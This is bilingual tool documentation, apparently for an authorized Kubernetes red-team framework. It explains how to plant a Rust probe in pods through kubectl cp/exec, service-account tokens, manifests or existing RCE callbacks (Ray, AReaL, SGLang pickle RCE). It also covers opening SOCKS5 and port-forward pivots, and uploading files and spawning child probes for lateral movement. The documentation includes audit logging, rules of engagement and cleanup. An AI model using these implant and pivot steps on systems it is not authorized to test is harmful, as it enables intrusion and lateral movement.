# In-pod probe and exec/SOCKS channel / 探针与通道

> 工作路径：拿到立足点 → 投放 Rust 探针 → 建立 `kubectl exec -i` stdio 通道
> → 采集、执行、利用、横向与代理都经探针完成。Host 直连只用于首次立足点的
> bootstrap，之后不再回退到 host（no host fallback）。
>
> 协议细节：[`PROBE-PROTOCOL.md`](PROBE-PROTOCOL.md)；模板 DSL：
> [`../probe/TEMPLATE-ENGINE.md`](../probe/TEMPLATE-ENGINE.md)。

## 1. 为什么不是“直接扫描” / Not a blind scanner

外部入口（`session --mode external`）只做有界证明：最多访问 profile 声明的
版本与指纹路径，并保留响应证据；确认脆弱版本（或拿到 route proof）之后才进入
`vulnerable`。没有 foothold 时只允许只读侦察，写模块与利用步骤会被状态机拒绝。
`kubeconfig` 与 `foothold` 模式也只在 bootstrap 阶段用到 host 的 kubectl；
探针就绪后，`session.run` 只向探针发模板任务。

状态机：

```
kubeconfig: new → ready → probe_ready → channel_ready → closed
external:   new → recon → vulnerable → foothold → probe_ready → channel_ready → closed
foothold:   new → foothold → probe_ready → channel_ready → closed
```

- `kubeconfig`：已授权评估；kubeconfig 只用于启动第一个探针。
- `external`：黑盒目标；必须先证明可达 + 脆弱版本/路由，才可 `mark_foothold`。
- `foothold`：已有 SA token / Pod shell；只用于投放探针。
- 每次状态迁移都写进 evidence run 的 `actions` 与 `audit.jsonl`；会话记录入口
  向量、凭据来源（只存 SHA256 指纹）、探针 ID 与父子关系、通道状态和证据 run。

## 2. 注入方式 / Injection

### 2.1 kubectl cp + exec（已有 Pod）

```sh
# 1) 上传静态探针（只落到 /tmp）
kubectl -n <ns> cp ./inkblade-probe-linux-amd64 <pod>:/tmp/.inkblade-probe
kubectl -n <ns> exec <pod> -- chmod 0700 /tmp/.inkblade-probe

# 2) 上传探针 HMAC token（0400），不要放进命令行
kubectl -n <ns> cp ./probe.token <pod>:/tmp/.inkblade-probe-token
kubectl -n <ns> exec <pod> -- chmod 0400 /tmp/.inkblade-probe-token

# 3) 建立通道
inkblade channel start --namespace <ns> --pod <pod> \
  --probe-path /tmp/.inkblade-probe \
  --token-file /tmp/.inkblade-probe-token \
  --probe-token-file ./probe.token --socks-port 1080
```

`channel start` 实际执行：

```sh
kubectl -n <ns> exec -i <pod> -- /tmp/.inkblade-probe run --stdio \
  --token-file /tmp/.inkblade-probe-token --read-only
```

stdout 只承载长度前缀 JSON 帧；stderr 是审计 JSONL。

### 2.2 RCE → probe（Ray/AReaL/SGLang 回调）

已有 RCE 模块提供 `CommandExecutor` 回调；`inkblade/entry/rce.py` 把静态
探针二进制 base64 分片写入 `/tmp`，用 `base64 -d` 或 `openssl` 解码，再
`chmod 0700`。默认 dry-run，只有带 `--allow-write` 且 RoE 为全影响演示时才执行：

```sh
inkblade probe deploy --session <id> --via rce --allow-write \
  --binary ./inkblade-probe-linux-amd64 --probe-token-file ./probe.token
```

RCE 回调（Ray 的 `POST /api/jobs/`、AReaL 的 `/set_env→/create_engine→/call`）
由 `executor_for(chain, target, callback=...)` 适配。SGLang 的写原语不算命令
执行，需要由 `sglang-zmq-pickle-rce` 提供真实的 callback。

### 2.3 SA token → probe

```sh
inkblade probe deploy --session <id> --via sa-token --allow-write \
  --namespace <ns> --pod <existing-pod> \
  --token-file ./sa.token --server https://10.0.0.1:6443 --ca ./ca.crt
# 或 --create-pod --image busybox:1.36：生成 sleep Pod 后 cp 探针
```

SA token 用于生成 0600 的临时 JSON kubeconfig；`kubectl cp/exec` 启动探针。
`kubeconfig` 仅在会话/通道存续期间保留，`session close`/`channel stop` 清理。

### 2.4 声明式 Pod / Job / EphemeralContainer

```sh
inkblade probe deploy --session <id> --via manifest --kind pod \
  --namespace <ns> --out probe-pod.json
inkblade probe deploy --session <id> --via manifest --kind job --apply --allow-write
```

默认安全上下文：`runAsNonRoot`、UID 65532、`allowPrivilegeEscalation:false`、
`capabilities.drop:["ALL"]`、`readOnlyRootFilesystem:true`、RuntimeDefault
seccomp、`automountServiceAccountToken:false`、无 hostPath。`/tmp` 为 32 MiB
memory emptyDir；token 通过 Secret 只读挂载。`--host-path` 只有显式
`allow_host_path` 才生成，且默认不提供该参数。

EphemeralContainer manifest 用 `kind: Pod` + `spec.ephemeralContainers`，通过
`kubectl replace --raw`/debug 子资源提交；它受目标 Pod 既有 volume 限制，默认
用于一次性 collect，不假设可写 `/tmp`。

## 3. 权限要求 / Permissions

| 方式 | 最小权限 | 说明 |
|---|---|---|
| kubectl cp/exec | `pods/exec`、`pods` get + 上传路径可写 | 不需要 cluster-admin；命名空间级即可 |
| SA token | 同 SA 的 `pods/exec`、`pods` get/create（create-pod 时） | API 只读 list/get 用 SA token + CA |
| RCE | 目标服务的已有 RCE 原语 | 不依赖 K8s RBAC；写 `/tmp` |
| manifest | `pods`/`jobs` create、`pods/ephemeralcontainers` patch | 仍受准入策略约束 |

探针本体的 `k8s list/get` 使用 Pod 内 SA token；`k8s exec/copy` 只在镜像内
存在 `kubectl` 时可用，没有 `kubectl` 就明确报错，不改走 host。K8s API 的
CA 校验默认开启。

## 4. 通道能力 / Channel

### SOCKS5（仅 127.0.0.1）

```sh
inkblade channel start --session <id> --socks-port 1080
curl --socks5-hostname 127.0.0.1:1080 http://<cluster-service>:8080/healthz
```

- 只支持 CONNECT（无 BIND/UDP）；仅监听回环，拒绝 `0.0.0.0`。
- 域名由**探针侧**解析并连接；操作机不需要集群 DNS/路由。
- 每个客户端一个 `dial` stream；多客户端通过 stream id 多路复用。
- 失败映射：拒绝=0x05，主机不可达=0x04，命令不支持=0x07。

### 端口转发等价

```sh
inkblade channel start --session <id> --no-socks \
  --forward 15432:postgres.ml.svc:5432 --forward 18080:10.0.0.8:8080
```

本地监听同样只在 `127.0.0.1`。`--forward LOCAL:HOST:PORT` 可重复；`LOCAL=0`
由系统分配并在 `channel status` 显示。

### 状态/停止

```sh
inkblade channel status --workspace lab --json
inkblade channel stop --workspace lab
```

状态文件在 `evidence/<workspace>/channel-state.json`，记录 PID、SOCKS/转发、
字节计数。`stop` 发 SIGTERM，子进程清理 streams、子探针和临时文件。

## 5. 探针任务 / Probe operations

`inkblade probe list|exec|collect|upload|download|spawn|cleanup` 全部经同一
stdio 通道：

```sh
inkblade probe collect --session <id> --json
inkblade probe exec --session <id> -- id
inkblade probe upload --session <id> --allow-write ./payload /tmp/payload
inkblade probe download --session <id> /tmp/result ./result
inkblade probe spawn --session <id> --parent-id child-a ./inkblade-probe-arm64
inkblade probe cleanup --session <id> --no-recursive
```

- `upload/download` 分块 + sha256；只允许 `/tmp`、`/var/tmp`、`/dev/shm`。
- `spawn` 支持 `--via direct|k8s-exec|shared-volume`；子探针登记
  `parent_id`，控制器通过父探针多路复用寻址，不需要新端口。
- 清理按父子树先叶后根；每个探针 `cleanup` 返回 removed 列表和剩余 children。
- `probe list` 读 SQLite 注册表（`probes.db`）：id/parent/ns/node/caps/last_seen/status。

## 6. 审计与清理 / Audit and cleanup

- 探针每次 `collect/exec/dial/task/upload/spawn/cleanup` 写一行 JSONL 到
  stderr（`--audit PATH` 可再加文件）；控制器写入 run 的 `actions` 与工作区
  `audit.jsonl`。
- 会话关闭会 finalize run；通道停止会发送 `cleanup`，删除 `/tmp` 前缀的临时
  文件并终止子探针。
- 失败同样记录：认证失败、超时、拒绝、越界、探针丢失都会写进审计。

## 7. 边界与已知限制 / Boundaries and known gaps

- 目标 Pod 内不执行 Python：模块是 JSON 模板，执行器是 Rust。
- 当前 native gap（`compile_template` 会报 `ProbeUnavailable`，不会回退到 host）：
  K8s 写动词/非 core API 组、Unix-socket 客户端、`fs.hash`、exec stdin。
- K8s `exec/copy` 依赖目标环境有 `kubectl`；没有就用 `k8s list/get` 与模板
  证据，不会假装成功。
- SOCKS 只监听回环；若需要从其他主机使用，请由操作机侧 SSH/端口转发到
  `127.0.0.1`，不要放开 `0.0.0.0`。
- Release 二进制由 CI（`probe-release.yml`）构建 linux-musl amd64/arm64；
  源码在 `probe/`，产物在 Release assets + `SHA256SUMS`，不入 git。

## English (short)

`inkblade-probe` is a single static Rust binary. It is delivered through `kubectl cp`
and `exec`, an existing RCE callback (base64 chunks to `/tmp`), an SA-token
bootstrap, or a generated hardened Pod/Job/EphemeralContainer manifest. The
operator side opens a `kubectl exec -i` framed-JSON channel; SOCKS5 and port
forwards listen on loopback only and dial through the probe. Sessions have
three explicit entry modes (`kubeconfig`, `external`, `foothold`); `external`
must prove a vulnerable version or route before any foothold or exploit, and no
foothold means read-only recon. Actions, credential fingerprints, probe
parent/child links and cleanup are audited. There is no host fallback after the
first bootstrap, and the target runs no interpreter.
